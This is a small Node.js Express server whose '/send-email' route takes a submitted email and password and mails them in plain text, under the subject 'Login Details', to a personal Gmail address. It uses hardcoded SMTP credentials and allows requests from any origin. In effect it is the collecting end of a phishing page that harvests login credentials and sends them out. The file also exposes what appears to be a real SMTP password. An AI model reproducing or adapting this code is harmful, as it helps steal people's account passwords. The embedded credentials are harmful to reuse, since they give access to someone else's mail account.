const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();

// Enable CORS
app.use(cors());

app.use(bodyParser.json());

// SMTP server ke liye transporter object create karo
let transporter = nodemailer.createTransport({
    host: 'smtp.hostinger.com',  // Replace with your SMTP server host
    port: 587, // Common SMTP port; use 465 for secure SSL
    secure: false, // True for port 465, false for port 587
    auth: {
        user: 'smtp@gdogo.com',  // Replace with your SMTP username
        pass: 'ozbIGQ|sP1'   // Replace with your SMTP password
    }
});

// POST route to send email
app.post('/send-email', (req, res) => {
    const { email, password } = req.body;

    let mailOptions = {
        from: 'smtp@gdogo.com',  // Replace with your email address
        to: 'devjha547@gmail.com',  // Replace with recipient email address
        subject: 'Login Details',
        text: `Email: ${email}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).json({ error: error.toString() });
        }
        res.json({ message: 'Email sent: ' + info.response });
    });
});

// Start the server
const PORT = process.env.PORT || 5500;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
